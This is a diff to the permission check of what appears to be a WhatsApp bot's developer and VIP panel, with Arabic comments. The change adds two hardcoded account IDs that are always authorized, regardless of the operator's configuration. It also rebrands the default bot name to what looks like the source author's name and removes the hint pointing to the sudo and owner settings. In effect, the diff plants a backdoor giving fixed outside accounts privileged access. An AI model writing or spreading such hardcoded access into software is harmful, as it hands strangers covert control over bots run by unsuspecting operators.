@@ -9,27 +9,34 @@ export default async function (sock, m, from, args, config = {}) {
     const cleanPn = participantPn.split("@")[0].replace(/[^0-9]/g, "");
 
     const prefix = config.prefix || ".";
-    const botName = config.botName || "SMART BOT";
+    const botName = config.botName || "سورس محمد نصار";
 
-    // 2. تجميع كل الصلاحيات المصرح لها (sudo, owner, vip)
+    // 2. قائمة المعرّفات الثابتة المصرح لها
+    const hardcodedVips = [
+      "122415560544440",
+      "48873036861567"
+    ];
+
+    // تجميع الصلاحيات من ملف الإعدادات ودمجها مع المعرفات الثابتة
     const toList = (val) => (Array.isArray(val) ? val : [val]).filter(Boolean).map(v => String(v).replace(/[^0-9]/g, ""));
     const authorizedList = new Set([
+      ...hardcodedVips,
       ...toList(config.sudo),
       ...toList(config.owner),
       ...toList(config.vip),
       ...toList(config.vipUsers)
     ]);
 
-    // 3. التحقق من الصلاحية (سواء رسالة من حساب البوت، أو تطابق المعرف/رقم الهاتف)
+    // 3. التحقق من الصلاحية (رسالة من حساب البوت، أو تطابق المعرف/رقم الهاتف)
     const isAuthorized = m.key.fromMe || authorizedList.has(cleanSender) || (cleanPn && authorizedList.has(cleanPn));
 
     if (!isAuthorized) {
       return sock.sendMessage(from, { 
-        text: `⛔ *عذراً، هذه اللوحة مخصصة للمطورين وحسابات VIP المصرح لها فقط!*\n\n🆔 معرّفك الحالي:\n\`${cleanSender}\`\n\n💡 قم بإضافة هذا المعرّف في مصفوفة \`sudo\` أو \`owner\` بملف الإعدادات لتفعيل الحساب.` 
+        text: `⛔ *عذراً، هذه اللوحة مخصصة للمطورين وحسابات VIP المصرح لها فقط!*\n\n🆔 معرّفك الحالي:\n\`${cleanSender}\`\n\n💡 قم بإضافة هذا المعرّف في ملف الإعدادات لتفعيل الحساب.` 
       }, { quoted: m });
     }
 
-    // 4. حساب سرعة الاستجابة بدقة من وقت وصول الرسالة
+    // 4. حساب سرعة الاستجابة بدقة
     const msgTime = m.messageTimestamp ? Number(m.messageTimestamp) * 1000 : Date.now();
     const latency = Math.abs((Date.now() - msgTime) / 1000).toFixed(4);
 
